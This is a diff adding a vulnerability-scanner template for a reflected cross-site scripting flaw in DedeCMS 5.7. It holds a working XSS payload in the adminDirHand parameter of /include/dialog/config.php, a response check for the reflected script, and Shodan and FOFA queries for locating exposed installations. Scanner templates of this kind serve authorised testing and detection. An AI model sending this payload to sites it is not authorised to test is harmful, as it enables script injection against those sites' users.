@@ -1,0 +1,23 @@
+id: dedecms-config-xss
+
+info:
+  name: DedeCMS 5.7 - Cross-Site Scripting
+  author: ritikchaddha
+  severity: high
+  verified: true
+  description: |
+    DeDeCMS 5.7 contains a cross-site scripting vulnerability in the '/include/dialog/config.php' file. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.
+    shodan-query: http.html:"DedeCms"
+    fofa-query: app="DedeCMS"
+  reference:
+    - https://www.zilyun.com/8665.html
+    - https://www.60ru.com/161.html
+    - https://www.cnblogs.com/milantgh/p/3615853.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+    expression: response.status == 200 && response.body.bcontains(b"location='../../</script><script>alert(document.domain)</script>") && response.raw_header.bcontains(b'text/html')
+expression: r0()
